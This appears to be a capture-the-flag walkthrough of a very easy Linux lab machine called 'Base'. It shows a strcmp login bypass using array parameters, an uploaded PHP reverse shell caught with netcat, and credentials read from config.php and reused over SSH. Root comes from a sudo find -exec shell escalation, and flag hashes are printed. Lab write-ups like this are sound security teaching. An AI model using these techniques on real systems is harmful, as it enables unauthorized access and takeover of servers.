System: Linux
Difficulty: Very Easy

IP Address: 10.129.95.184

# User Flag

Ports are enumerated with NMAP.
```
kali@kali:~$ sudo nmap 10.129.95.184 -sC -sV -p- -v
```

Here are the results of the port scan.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
|   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
|_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: Welcome to Base
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There is a login form visible on the website.
![[base_1.png]]

Directories are enumerated.
```
kali@kali:~$ gobuster dir -u http://10.129.95.184/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-big.txt -t 50
```

As a result, it is possible to find that there is a directory called `/_uploaded` that checks for uploaded files.

Also, inside the `/login` directory, it is possible to see 3 files alongside the `login.php` webpage. `config.php` is unaccessible but `login.php.swp` is accessible.

According to the checks in the `login.php.swp` file, the parameters checks can be bypassed easily through the brackets injection in the parameters. The source code has not implemented a correct validation mechanism.
```
if (strcmp($password, $_POST['password']) == 0) {    if (strcmp($username, $_POST['username']) == 0) 
```

Here are the parameters to inject when logging in.
```
username[]=user&password[]=pass
```

A file uploading form is now accessible.
![[base_2.png]]

The `php-reverse-shell.php` file will be uploaded to the server.
Making sure to listen on the user's side.
```
sudo nc -lvnp 4444
```

The reverse shell is thrown after accessing this link from the browser.
```
http://10.129.95.184/_uploaded/php-reverse-shell.php
```

A shell has been successfully returned from this command execution.
```
Connection received on 10.129.95.184 42882
Linux base 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 03:41:21 up 47 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

After viewing the `config.php` from the victim server machine, in the web directory.
```
$username = "admin";
$password = "thisisagoodpassword"
```

And in the `/etc/passwd` file contents.
```
<SNIP>
john:x:1000:1000:John:/home/john:/bin/bash
```

Now, a SSH Login will be attempted with those credentials, `john:thisisagoodpassword`.
```
kali@kali:~$ ssh john@10.129.95.184
```

User Flag contents are in below.
```
f54846c258f3b4612f78a819573d158e
```

# Root Flag

The permissions will be examined.
```
john@base:~$ sudo -l
```

As a result, it is possible to see the user `john` running this privileged command.
```
User john may run the following
        commands on base:
    (root : root) /usr/bin/find
```

After searching through GTFOBins, there is a command that can be used to exploit the system.
```
john@base:~$ sudo /usr/bin/find . -exec /bin/sh \; -quit
```

After execution, a root shell has been returned as a result.

Root Flag contents are in below.
```
51709519ea18ab37dd6fc58096bea949
```